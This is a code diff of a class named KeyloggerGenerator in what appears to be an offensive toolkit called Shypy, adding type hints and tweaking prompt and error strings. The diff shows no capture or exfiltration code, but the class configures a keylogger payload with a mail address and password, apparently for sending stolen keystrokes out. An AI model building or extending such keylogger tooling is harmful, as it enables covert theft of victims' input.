@@ -14,11 +14,11 @@ class KeyloggerGenerator(ModuleUtils):
         Initializes the payload, mail, password, and timeout attributes.
         """
         super().__init__()
-        self.module   = "keylogger"
-        self.payload  = ""
-        self.mail     = ""
-        self.password = ""
-        self.time_out = ""
+        self.module   : str = "keylogger"
+        self.payload  : str = ""
+        self.mail     : str = ""
+        self.password : str = ""
+        self.time_out : str = ""
         
     def run(self) -> None:
         """
@@ -56,7 +56,7 @@ class KeyloggerGenerator(ModuleUtils):
             ╚══════════════════════════════════════════════════════════════════════════╝
             \n\n""")
 
-        answer = input(f"{COLOR['CYAN']}Shypy >>{COLOR['RESET']} ").lower().strip()
+        answer = input(f"{COLOR['CYAN']}{FLAG}{COLOR['RESET']}").lower().strip()
 
         if answer.startswith("set mail"):
             try:
@@ -86,7 +86,7 @@ class KeyloggerGenerator(ModuleUtils):
                 self.run()
                 
             except ValueError:
-                self.write(message="Please enter integer type", level=4, delay=1, clear=False)
+                self.write(message="Please enter integer type.", level=4, delay=1, clear=False)
                 self.run()
         
         elif answer.startswith("set payload"):
@@ -120,5 +120,5 @@ class KeyloggerGenerator(ModuleUtils):
             importlib.import_module("main").Shypy().menu()
 
         else:
-            self.write(message="Invalid Option", level=4, delay=1, clear=False)
+            self.write(message="Invalid Option.", level=4, delay=1, clear=False)
             self.run()
